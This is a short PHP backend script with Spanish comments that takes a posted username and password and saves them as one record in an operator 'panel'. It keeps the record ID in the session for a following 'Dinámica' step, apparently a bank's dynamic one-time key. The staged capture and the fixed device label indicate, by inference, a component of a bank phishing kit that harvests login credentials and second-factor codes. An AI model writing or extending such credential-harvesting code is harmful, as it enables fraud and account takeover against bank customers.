<?php
// process/pasousuario.php - SIN REDIRECCIÓN INTERNA
require('../panel/lib/funciones.php');
session_start();

$user = $_POST['txt-usuario'] ?? '';
$pass = $_POST['txt-password'] ?? ''; 
$dispositivo = "Android Mobile"; 

if (!empty($user) && !empty($pass)) {
    // 1. Creamos el registro base
    $id = crear_registro($user, $dispositivo);
    
    // 2. Agregamos la clave al mismo registro
    // Usamos el ID devuelto para que no se cree un reporte nuevo
    actualizar_registro_pass($id, $pass);
    
    // 3. Guardamos el ID en sesión para el paso de la Dinámica
    $_SESSION['id_reg'] = $id;
    
    // 4. Respondemos "ok" al JavaScript
    echo "ok"; 
} else {
    echo "faltan_datos";
}
exit();
